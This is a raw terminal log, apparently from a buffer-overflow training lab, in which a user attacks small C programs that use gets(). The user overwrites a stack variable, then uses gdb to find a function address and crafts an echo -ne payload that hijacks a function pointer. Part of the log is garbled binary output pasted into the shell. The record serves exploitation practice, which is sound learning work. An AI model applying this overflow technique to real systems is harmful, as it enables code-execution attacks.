
```sh
┌──(kali㉿kali)-[~/shells]
└─$ ssh user1@10.10.167.49
The authenticity of host '10.10.167.49 (10.10.167.49)' can´t be established.
ED25519 key fingerprint is SHA256:AsF56RWYwwHAw06LwzfQZsBY9+GuN1jrYmQRK3FP5dU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.167.49' (ED25519) to the list of known hosts.
user1@10.10.167.49´s password: 
Last login: Wed Nov 27 21:42:30 2019 from 82.34.52.37

       __|  __|_  )
       _|  (     /   Amazon Linux 2 AMI
      ___|\___|___|

https://aws.amazon.com/amazon-linux-2/
[user1@ip-10-10-167-49 ~]$ ls -la
total 16
drwx------ 7 user1 user1 169 Nov 27  2019 .
drwxr-xr-x 6 root  root   61 Sep  2  2019 ..
-rw------- 1 user1 user1 202 Nov 27  2019 .bash_history
-rw-r--r-- 1 user1 user1  18 Jul 27  2018 .bash_logout
-rw-r--r-- 1 user1 user1 193 Jul 27  2018 .bash_profile
-rw-r--r-- 1 user1 user1 231 Jul 27  2018 .bashrc
drwxr-xr-x 3 user1 user1  21 Nov 27  2019 .cache
drwxrwxr-x 2 user1 user1  48 Sep  2  2019 overflow-1
drwxrwxr-x 2 user1 user1  48 Sep  2  2019 overflow-2
drwxrwxr-x 2 user1 user1  72 Sep  2  2019 overflow-3
drwxrwxr-x 2 user1 user1  76 Sep  3  2019 overflow-4
[user1@ip-10-10-167-49 ~]$ cd overflow-1
[user1@ip-10-10-167-49 overflow-1]$ ls -la
total 16
drwxrwxr-x 2 user1 user1   48 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwxrwxr-x 1 user1 user1 8224 Sep  2  2019 int-overflow
-rw-rw-r-- 1 user1 user1  291 Sep  2  2019 int-overflow.c
[user1@ip-10-10-167-49 overflow-1]$ cat int-overflow.c 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int variable = 0;
  char buffer[14];

  gets(buffer);

  if(variable != 0) {
      printf("You have changed the value of the variable\n");
  } else {
      printf("Try again?\n");
  }
}
[user1@ip-10-10-167-49 overflow-1]$ ./int-overflow
123456789012345
You have changed the value of the variable
[user1@ip-10-10-167-49 overflow-1]$ ./int-overflow
123
Try again?
[user1@ip-10-10-167-49 overflow-1]$ ./int-overflow
12345678901234
Try again?
[user1@ip-10-10-167-49 overflow-1]$ ./int-overflow
12345678901234\0
You have changed the value of the variable
[user1@ip-10-10-167-49 overflow-1]$ gcc
gcc: fatal error: no input files
compilation terminated.
[user1@ip-10-10-167-49 overflow-1]$ ls -la
total 16
drwxrwxr-x 2 user1 user1   48 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwxrwxr-x 1 user1 user1 8224 Sep  2  2019 int-overflow
-rw-rw-r-- 1 user1 user1  291 Sep  2  2019 int-overflow.c
[user1@ip-10-10-167-49 overflow-1]$ nano int-overflow.c
[user1@ip-10-10-167-49 overflow-1]$ gcc int-overflow.c -o int-overflow2
int-overflow.c: In function ‘main’:
int-overflow.c:10:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   gets(buffer);
   ^~~~
   fgets
/tmp/ccxSdrRr.o: In function `main':
int-overflow.c:(.text+0x23): warning: the `gets' function is dangerous and should not be used.
[user1@ip-10-10-167-49 overflow-1]$ ls -la
total 28
drwxrwxr-x 2 user1 user1   69 Aug  5 15:34 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwxrwxr-x 1 user1 user1 8224 Sep  2  2019 int-overflow
-rw-rw-r-- 1 user1 user1  291 Aug  5 15:34 int-overflow.c
-rwxrwxr-x 1 user1 user1 8272 Aug  5 15:34 int-overflow2
[user1@ip-10-10-167-49 overflow-1]$ ./int-overflow2
12345678901234
You have changed the value of the variable
[user1@ip-10-10-167-49 overflow-1]$ ./int-overflow2
123
Try again?
[user1@ip-10-10-167-49 overflow-1]$ cd ..
[user1@ip-10-10-167-49 ~]$ ls -la
total 16
drwx------ 7 user1 user1 169 Nov 27  2019 .
drwxr-xr-x 6 root  root   61 Sep  2  2019 ..
-rw------- 1 user1 user1 202 Nov 27  2019 .bash_history
-rw-r--r-- 1 user1 user1  18 Jul 27  2018 .bash_logout
-rw-r--r-- 1 user1 user1 193 Jul 27  2018 .bash_profile
-rw-r--r-- 1 user1 user1 231 Jul 27  2018 .bashrc
drwxr-xr-x 3 user1 user1  21 Nov 27  2019 .cache
drwxrwxr-x 2 user1 user1  69 Aug  5 15:34 overflow-1
drwxrwxr-x 2 user1 user1  48 Sep  2  2019 overflow-2
drwxrwxr-x 2 user1 user1  72 Sep  2  2019 overflow-3
drwxrwxr-x 2 user1 user1  76 Sep  3  2019 overflow-4
[user1@ip-10-10-167-49 ~]$ cd overflow-2
[user1@ip-10-10-167-49 overflow-2]$ ls -la
total 16
drwxrwxr-x 2 user1 user1   48 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwxrwxr-x 1 user1 user1 8368 Sep  2  2019 func-pointer
-rw-rw-r-- 1 user1 user1  411 Sep  2  2019 func-pointer.c
[user1@ip-10-10-167-49 overflow-2]$ nano func-pointer.c
[user1@ip-10-10-167-49 overflow-2]$ ./func-pointer 
test
this is the normal function
[user1@ip-10-10-167-49 overflow-2]$ ./func-pointer 
12345678901234123
Segmentation fault
[user1@ip-10-10-167-49 overflow-2]$ strace
strace: must have PROG [ARGS] or -p PID
Try 'strace -h' for more information.
[user1@ip-10-10-167-49 overflow-2]$ strace -h
usage: strace [-CdffhiqrtttTvVwxxy] [-I n] [-e expr]...
              [-a column] [-o file] [-s strsize] [-P path]...
              -p pid... / [-D] [-E var=val]... [-u username] PROG [ARGS]
   or: strace -c[dfw] [-I n] [-e expr]... [-O overhead] [-S sortby]
              -p pid... / [-D] [-E var=val]... [-u username] PROG [ARGS]

Output format:
  -a column      alignment COLUMN for printing syscall results (default 40)
  -i             print instruction pointer at time of syscall
  -o file        send trace output to FILE instead of stderr
  -q             suppress messages about attaching, detaching, etc.
  -r             print relative timestamp
  -s strsize     limit length of print strings to STRSIZE chars (default 32)
  -t             print absolute timestamp
  -tt            print absolute timestamp with usecs
  -T             print time spent in each syscall
  -x             print non-ascii strings in hex
  -xx            print all strings in hex
  -y             print paths associated with file descriptor arguments
  -yy            print protocol specific information associated with socket file descriptors

Statistics:
  -c             count time, calls, and errors for each syscall and report summary
  -C             like -c but also print regular output
  -O overhead    set overhead for tracing syscalls to OVERHEAD usecs
  -S sortby      sort syscall counts by: time, calls, name, nothing (default time)
  -w             summarise syscall latency (default is system time)

Filtering:
  -e expr        a qualifying expression: option=[!]all or option=[!]val1[,val2]...
     options:    trace, abbrev, verbose, raw, signal, read, write, fault
  -P path        trace accesses to path

Tracing:
  -b execve      detach on execve syscall
  -D             run tracer process as a detached grandchild, not as parent
  -f             follow forks
  -ff            follow forks with output into separate files
  -I interruptible
     1:          no signals are blocked
     2:          fatal signals are blocked while decoding syscall (default)
     3:          fatal signals are always blocked (default if '-o FILE PROG')
     4:          fatal signals and SIGTSTP (^Z) are always blocked
                 (useful to make 'strace -o FILE PROG' not stop on ^Z)

Startup:
  -E var         remove var from the environment for command
  -E var=val     put var=val in the environment for command
  -p pid         trace process with process id PID, may be repeated
  -u username    run command as username handling setuid and/or setgid

Miscellaneous:
  -d             enable debug output to stderr
  -v             verbose mode: print unabbreviated argv, stat, termios, etc. args
  -h             print help message
  -V             print version
[user1@ip-10-10-167-49 overflow-2]$ strace func-pointer
strace: Can´t stat 'func-pointer': No such file or directory
[user1@ip-10-10-167-49 overflow-2]$ strace ./func-pointer
execve("./func-pointer", ["./func-pointer"], 0x7fffffffe4d0 /* 22 vars */) = 0
brk(NULL)                               = 0x602000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=27828, ...}) = 0
mmap(NULL, 27828, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffff7ff0000
close(3)                                = 0
openat(AT_FDCWD, "/lib64/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\22\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=2030048, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fee000
mmap(NULL, 3852960, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff7a2c000
mprotect(0x7ffff7bd0000, 2093056, PROT_NONE) = 0
mmap(0x7ffff7dcf000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a3000) = 0x7ffff7dcf000
mmap(0x7ffff7dd5000, 15008, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7dd5000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7fef4c0) = 0
mprotect(0x7ffff7dcf000, 16384, PROT_READ) = 0
mprotect(0x600000, 4096, PROT_READ)     = 0
mprotect(0x7ffff7ffc000, 4096, PROT_READ) = 0
munmap(0x7ffff7ff0000, 27828)           = 0
fstat(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
brk(NULL)                               = 0x602000
brk(0x623000)                           = 0x623000
brk(NULL)                               = 0x623000
read(0, 123
"123\n", 1024)                  = 4
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
write(1, "this is the normal function\n", 28this is the normal function
) = 28
exit_group(0)                           = ?
+++ exited with 0 +++
[user1@ip-10-10-167-49 overflow-2]$ strace ./func-pointer
execve("./func-pointer", ["./func-pointer"], 0x7fffffffe4d0 /* 22 vars */) = 0
brk(NULL)                               = 0x602000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=27828, ...}) = 0
mmap(NULL, 27828, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffff7ff0000
close(3)                                = 0
openat(AT_FDCWD, "/lib64/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0P\22\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=2030048, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fee000
mmap(NULL, 3852960, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff7a2c000
mprotect(0x7ffff7bd0000, 2093056, PROT_NONE) = 0
mmap(0x7ffff7dcf000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a3000) = 0x7ffff7dcf000
mmap(0x7ffff7dd5000, 15008, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7dd5000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7fef4c0) = 0
mprotect(0x7ffff7dcf000, 16384, PROT_READ) = 0
mprotect(0x600000, 4096, PROT_READ)     = 0
mprotect(0x7ffff7ffc000, 4096, PROT_READ) = 0
munmap(0x7ffff7ff0000, 27828)           = 0
fstat(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
brk(NULL)                               = 0x602000
brk(0x623000)                           = 0x623000
brk(NULL)                               = 0x623000
read(0, 1234567890123412345
"1234567890123412345\n", 1024)  = 20
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x3534333231} ---
+++ killed by SIGSEGV +++
Segmentation fault
[user1@ip-10-10-167-49 overflow-2]$ cat func-pointer.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void special()
{
    printf("this is the special function\n");
    printf("you did this, friend!\n");
}

void normal()
{
    printf("this is the normal function\n");
}

void other()
{
    printf("why is this here?");
}

int main(int argc, char **argv)
{
    volatile int (*new_ptr) () = normal;
    char buffer[14];
    gets(buffer);
    new_ptr();
}
[user1@ip-10-10-167-49 overflow-2]$ gdb ./func-pointer 
GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./func-pointer...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x4005ad
(gdb) run
Starting program: /home/user1/overflow-2/func-pointer 
Missing separate debuginfos, use: debuginfo-install glibc-2.26-64.amzn2.0.2.x86_64

Breakpoint 1, 0x00000000004005ad in main ()
(gdb) p &buffer
Cannot find thread-local storage for process 19265, shared library /lib64/libc.so.6:
Cannot find thread-local variables on this target
(gdb) p &new_ptr
No symbol table is loaded.  Use the "file" command.
(gdb) next
Single stepping until exit from function main,
which has no line number information.
next
this is the normal function
0x00007ffff7a4d13a in __libc_start_main () from /lib64/libc.so.6
(gdb) next
Single stepping until exit from function __libc_start_main,
which has no line number information.
[Inferior 1 (process 19265) exited normally]
(gdb) p &buffer
Cannot find thread-local storage for process 0, shared library /lib64/libc.so.6:
Cannot find thread-local variables on this target
(gdb) p &new_ptr
No symbol table is loaded.  Use the "file" command.
(gdb) next
The program is not being run.
(gdb) next^CQuit
(gdb) exit
Undefined command: "exit".  Try "help".
(gdb) help
List of classes of commands:

aliases -- Aliases of other commands
breakpoints -- Making program stop at certain points
data -- Examining data
files -- Specifying and examining files
internals -- Maintenance commands
obscure -- Obscure features
running -- Running the program
stack -- Examining the stack
status -- Status inquiries
support -- Support facilities
tracepoints -- Tracing of program execution without stopping the program
user-defined -- User-defined commands

Type "help" followed by a class name for a list of commands in that class.
Type "help all" for the list of all commands.
Type "help" followed by command name for full documentation.
Type "apropos word" to search for commands related to "word".
Command name abbreviations are allowed if unambiguous.
(gdb) ^CQuit
(gdb) ^CQuit
(gdb) ^CQuit
(gdb) ^CQuit
(gdb) quit
[user1@ip-10-10-167-49 overflow-2]$ ls -la
total 16
drwxrwxr-x 2 user1 user1   48 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwxrwxr-x 1 user1 user1 8368 Sep  2  2019 func-pointer
-rw-rw-r-- 1 user1 user1  411 Sep  2  2019 func-pointer.c
[user1@ip-10-10-167-49 overflow-2]$ gdb ./func-pointer 
GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./func-pointer...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x4005ad
(gdb) run
Starting program: /home/user1/overflow-2/func-pointer 
Missing separate debuginfos, use: debuginfo-install glibc-2.26-64.amzn2.0.2.x86_64

Breakpoint 1, 0x00000000004005ad in main ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffe3c0:
 rip = 0x4005ad in main; saved rip = 0x7ffff7a4d13a
 Arglist at 0x7fffffffe3b0, args: 
 Locals at 0x7fffffffe3b0, Previous frame´s sp is 0x7fffffffe3c0
 Saved registers:
  rbp at 0x7fffffffe3b0, rip at 0x7fffffffe3b8
(gdb) next
Single stepping until exit from function main,
which has no line number information.
info frame
this is the normal function
0x00007ffff7a4d13a in __libc_start_main () from /lib64/libc.so.6
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-2/func-pointer 

Breakpoint 1, 0x00000000004005ad in main ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffe3c0:
 rip = 0x4005ad in main; saved rip = 0x7ffff7a4d13a
 Arglist at 0x7fffffffe3b0, args: 
 Locals at 0x7fffffffe3b0, Previous frame´s sp is 0x7fffffffe3c0
 Saved registers:
  rbp at 0x7fffffffe3b0, rip at 0x7fffffffe3b8
(gdb) x/32xb $sp-32
0x7fffffffe390: 0xf0    0x05    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffe398: 0x90    0x04    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffe3a0: 0x90    0xe4    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffe3a8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
(gdb) x/32xb $sp-64
0x7fffffffe370: 0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe378: 0x3d    0x06    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffe380: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe388: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
(gdb) x/64xb $sp-32
0x7fffffffe390: 0xf0    0x05    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffe398: 0x90    0x04    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffe3a0: 0x90    0xe4    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffe3a8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe3b0: 0xf0    0x05    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffe3b8: 0x3a    0xd1    0xa4    0xf7    0xff    0x7f    0x00    0x00
0x7fffffffe3c0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffe3c8: 0x98    0xe4    0xff    0xff    0xff    0x7f    0x00    0x00
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400438  _init
0x0000000000400460  puts@plt
0x0000000000400470  printf@plt
0x0000000000400480  gets@plt
0x0000000000400490  _start
0x00000000004004c0  deregister_tm_clones
0x00000000004004f0  register_tm_clones
0x0000000000400530  __do_global_dtors_aux
0x0000000000400560  frame_dummy
0x0000000000400567  special
0x0000000000400582  normal
0x0000000000400593  other
0x00000000004005a9  main
0x00000000004005f0  __libc_csu_init
0x0000000000400660  __libc_csu_fini
0x0000000000400664  _fini
0x00007ffff7dd9d10  malloc@plt
0x00007ffff7dd9d20  calloc@plt
0x00007ffff7dd9d30  realloc@plt
0x00007ffff7dd9d40  _dl_signal_error@plt
0x00007ffff7dd9d50  _dl_catch_error@plt
0x00007ffff7dd9d60  free@plt
0x00007ffff7dd9d70  init_tls
0x00007ffff7dd9ec1  oom
0x00007ffff7dd9ef0  _start
0x00007ffff7dd9ef8  _dl_start_user
0x00007ffff7dd9f40  rtld_lock_default_lock_recursive
0x00007ffff7dd9f50  rtld_lock_default_unlock_recursive
---Type <return> to continue, or q <return> to quit---
0x00007ffff7dd9f60  lookup_doit
0x00007ffff7dd9fc0  dlmopen_doit
0x00007ffff7dda010  print_unresolved
0x00007ffff7dda050  print_missing_version
0x00007ffff7dda090  do_preload
0x00007ffff7dda130  map_doit
0x00007ffff7dda160  print_statistics
0x00007ffff7dda810  relocate_doit
0x00007ffff7dda830  process_dl_debug
0x00007ffff7ddaa30  dso_name_valid_for_suid
0x00007ffff7ddaa80  version_check_doit
0x00007ffff7ddaab0  _dl_start
0x00007ffff7ddb060  handle_ld_preload
0x00007ffff7ddb100  dl_main
0x00007ffff7dde3a0  is_trusted_path_normalize
0x00007ffff7dde4f0  lose
0x00007ffff7dde570  is_dst.isra
0x00007ffff7dde600  add_name_to_object.isra
0x00007ffff7dde6e0  _dl_map_object_from_fd
0x00007ffff7ddf900  open_verify.constprop
0x00007ffff7ddfed0  open_path
0x00007ffff7de04c0  add_path.isra.4.constprop
0x00007ffff7de0580  _dl_dst_count
0x00007ffff7de0610  _dl_dst_substitute
0x00007ffff7de0890  expand_dynamic_string_token
0x00007ffff7de09b0  fillin_rpath
0x00007ffff7de0d40  decompose_rpath
0x00007ffff7de0f00  cache_rpath.part
0x00007ffff7de0f40  _dl_init_paths
0x00007ffff7de12b0  _dl_map_object
0x00007ffff7de1cd0  _dl_rtld_di_serinfo
---Type <return> to continue, or q <return> to quit---
0x00007ffff7de1eb0  check_match
0x00007ffff7de2030  do_lookup_x
0x00007ffff7de2b50  _dl_lookup_symbol_x
0x00007ffff7de3c70  _dl_setup_hash
0x00007ffff7de3d20  _dl_add_to_namespace_list
0x00007ffff7de3db0  _dl_new_object
0x00007ffff7de4100  _dl_try_allocate_static_tls
0x00007ffff7de41d0  _dl_allocate_static_tls
0x00007ffff7de4200  _dl_nothread_init_static_tls
0x00007ffff7de4240  _dl_protect_relro
0x00007ffff7de42a0  _dl_reloc_bad_type
0x00007ffff7de4370  _dl_relocate_object
0x00007ffff7de5ad0  _dl_build_local_scope
0x00007ffff7de5b40  openaux
0x00007ffff7de5b80  _dl_map_object_deps
0x00007ffff7de6f80  _dl_important_hwcaps
0x00007ffff7de7680  _dl_fixup
0x00007ffff7de7810  _dl_profile_fixup
0x00007ffff7de7d70  _dl_call_pltexit
0x00007ffff7de7e60  call_init.part
0x00007ffff7de7f70  _dl_init
0x00007ffff7de80b0  _dl_sort_fini
0x00007ffff7de8370  _dl_fini
0x00007ffff7de86f0  __GI__dl_debug_state
0x00007ffff7de86f0  _dl_debug_state
0x00007ffff7de8700  _dl_debug_initialize
0x00007ffff7de8780  _dl_debug_vdprintf
0x00007ffff7de8d50  _dl_sysdep_read_whole_file
0x00007ffff7de8de0  _dl_debug_printf
0x00007ffff7de8e90  _dl_debug_printf_c
0x00007ffff7de8f40  _dl_dprintf
---Type <return> to continue, or q <return> to quit---
0x00007ffff7de8fe0  _dl_name_match_p
0x00007ffff7de9040  _dl_higher_prime_number
0x00007ffff7de90b0  _dl_strtoul
0x00007ffff7de91e0  match_symbol
0x00007ffff7de95b0  _dl_check_map_versions
0x00007ffff7de99f0  _dl_check_all_versions
0x00007ffff7de9a60  _dl_start_profile
0x00007ffff7dea1a0  __GI__dl_mcount
0x00007ffff7dea1a0  _dl_mcount
0x00007ffff7dea3d0  allocate_dtv
0x00007ffff7dea410  _dl_resize_dtv
0x00007ffff7dea4b0  tls_get_addr_tail
0x00007ffff7dea6b0  _dl_next_tls_modid
0x00007ffff7dea790  _dl_count_modids
0x00007ffff7dea7e0  _dl_determine_tlsoffset
0x00007ffff7dea990  _dl_get_tls_static_info
0x00007ffff7dea9b0  _dl_allocate_tls_storage
0x00007ffff7deaa60  __GI__dl_allocate_tls_init
0x00007ffff7deaa60  _dl_allocate_tls_init
0x00007ffff7deacd0  __GI__dl_allocate_tls
0x00007ffff7deacd0  _dl_allocate_tls
0x00007ffff7dead00  __GI__dl_deallocate_tls
0x00007ffff7dead00  _dl_deallocate_tls
0x00007ffff7dead80  _dl_update_slotinfo
0x00007ffff7deaf90  update_get_addr
0x00007ffff7deafd0  __GI___tls_get_addr
0x00007ffff7deafd0  ___tls_get_addr
0x00007ffff7deb010  _dl_tls_get_addr_soft
0x00007ffff7deb080  _dl_add_to_slotinfo
0x00007ffff7deb160  __tls_get_addr_slow
0x00007ffff7deb190  _dl_get_origin
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) next
Single stepping until exit from function main,
which has no line number information.

this is the normal function
0x00007ffff7a4d13a in __libc_start_main () from /lib64/libc.so.6
(gdb) Connection to 10.10.167.49 closed by remote host.
Connection to 10.10.167.49 closed.

```

```sh
┌──(kali㉿kali)-[~]
└─$ ssh user1@10.10.167.49
^X^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ ssh user1@10.10.181.246
user1@10.10.181.246's password: 
Last login: Tue Aug  6 12:16:10 2024 from ip-10-21-31-111.eu-west-1.compute.internal

       __|  __|_  )
       _|  (     /   Amazon Linux 2 AMI
      ___|\___|___|

https://aws.amazon.com/amazon-linux-2/
76 package(s) needed for security, out of 158 available
Run "sudo yum update" to apply all updates.
[user1@ip-10-10-181-246 ~]$ ls -la
total 16
drwx------ 7 user1 user1 169 Nov 27  2019 .
drwxr-xr-x 6 root  root   61 Sep  2  2019 ..
-rw------- 1 user1 user1 202 Nov 27  2019 .bash_history
-rw-r--r-- 1 user1 user1  18 Jul 27  2018 .bash_logout
-rw-r--r-- 1 user1 user1 193 Jul 27  2018 .bash_profile
-rw-r--r-- 1 user1 user1 231 Jul 27  2018 .bashrc
drwxr-xr-x 3 user1 user1  21 Nov 27  2019 .cache
drwxrwxr-x 2 user1 user1  48 Sep  2  2019 overflow-1
drwxrwxr-x 2 user1 user1  57 Aug  6 13:57 overflow-2
drwxrwxr-x 2 user1 user1  72 Sep  2  2019 overflow-3
drwxrwxr-x 2 user1 user1  76 Sep  3  2019 overflow-4
[user1@ip-10-10-181-246 ~]$ cd overflow-2
[user1@ip-10-10-181-246 overflow-2]$ ls -la
total 20
drwxrwxr-x 2 user1 user1   57 Aug  6 13:57 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwxrwxr-x 1 user1 user1 8368 Sep  2  2019 func-pointer
-rw-rw-r-- 1 user1 user1  411 Sep  2  2019 func-pointer.c
-rw-rw-r-- 1 user1 user1 4096 Aug  6 13:57 m
[user1@ip-10-10-181-246 overflow-2]$ hexedit m
-bash: hexedit: command not found
[user1@ip-10-10-181-246 overflow-2]$ cat m
ELF>�@@p@8      @@@@@@�88@8@@@ ``$(   ` `�TT@T@DDP�td��@�@LLQ�tdR�td``��/lib64/ld-linux-x86-64.so.2GNUGNUJHxC�aœ�F~�^��˶��: 
                                                                                                                            libc.so.6getsputsprintf__libc_start_mainGLIBC_2.2.5__gmon_start__u▒i      .�`�`▒` `(`H�H��
                                                                                         H��t��H���5�
                                                                                                      �%�
                                                                                                          @�%�
                                                                                                               h������%�
                                                                                                                         h������%�
     h�����1�I��^H��H���PTI��`@H���@H�ǩ@�6
]�8`��D]�fD�8`UH��8`H��H��H��H��?H�H��t�H��tDU�8`H=8`H��t�H��t
                                            ]�8`��]�fD�=�
 uUH���~�����
 ]�D��@f.�UH��]��UH�忀@�������@������]�UH�忳@������]�UH����@�������]�UH��H��0�}�H�u�H�E��@H�E�H�Ǹ�����H�U���Ҹ��f.�AWAVI��AUATL� UH� SA��I��L)�H�H������H��t 1��L��L��D��A��H��H9�u�H�[]A\A]A^A_Ðf.���H�H��this is the special functionyou did this, friend!this is the normal functionwhy is this here?l��������d�������������������
                                                                        ���<|����zRx
                                                                                   @���+zRx
                                                                                          $����@F▒J
V                                                                                                  �?▒;*3$"D�����C
L����A�C
Q����A�C
u����:A�C
D�����eB�B▒�E �B(�H0�H8�M@r8A0A(B B▒BB
                                     ����`@0@
d@▒▒���o�@H@�@                               8@
I
 ▒`H�@�0        ▒���o�@���o���o�@[user1@ip-10-10-181-246 overflow-2]$ 
[user1@ip-10-10-181-246 overflow-2]$  ]�D��@f.�UH��]��UH�忀@�������@������]�UH�忳@������]�UH����@�������]�UH��H��0�}�H�u�H�E��@H�E�H�Ǹ�����H�U���Ҹ��f.�AWAVI��AUATL� UH� SA��I��L)�H�H������H��t 1��L��L��D��A��H��H9�u�H�[]A\A]A^A_Ðf.���H�H��this is the special functionyou did this, friend!this is the normal functionwhy is this here?l��������d�������������������
-bash: !this: event not found
[user1@ip-10-10-181-246 overflow-2]$                                                                         ���<|����zRx
-bash: syntax error near unexpected token `|'
[user1@ip-10-10-181-246 overflow-2]$                                                                                    @���+zRx
-bash: @���+zRx: command not found
[user1@ip-10-10-181-246 overflow-2]$                                                                                           $����@F▒J
-bash: $����@F▒J: command not found
[user1@ip-10-10-181-246 overflow-2]$ V                                                                                                  �?▒;*3$"D�����C
> L����A�C
> Q����A�C
> u����:A�C
> D�����eB�B▒�E �B(�H0�H8�M@r8A0A(B B▒BB
>                                      ����`@0@
> ^C
[user1@ip-10-10-181-246 overflow-2]$ echo -ne "AAAAAAAAAAAAAA\x67\x05\x40\x00\x00\x00\x00\x00" > input
[user1@ip-10-10-181-246 overflow-2]$ ./func-pointer < input
this is the special function
you did this, friend!
[user1@ip-10-10-181-246 overflow-2]$ echo -ne "AAAAAAAAAAAAAA\x67\x05\x40\x00\x00\x00\x00\x00" | ./func-pointer

```


```sh
┌──(kali㉿kali)-[~]
└─$ ssh user1@10.10.77.8   
The authenticity of host '10.10.77.8 (10.10.77.8)' can't be established.
ED25519 key fingerprint is SHA256:AsF56RWYwwHAw06LwzfQZsBY9+GuN1jrYmQRK3FP5dU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
    ~/.ssh/known_hosts:72: [hashed name]
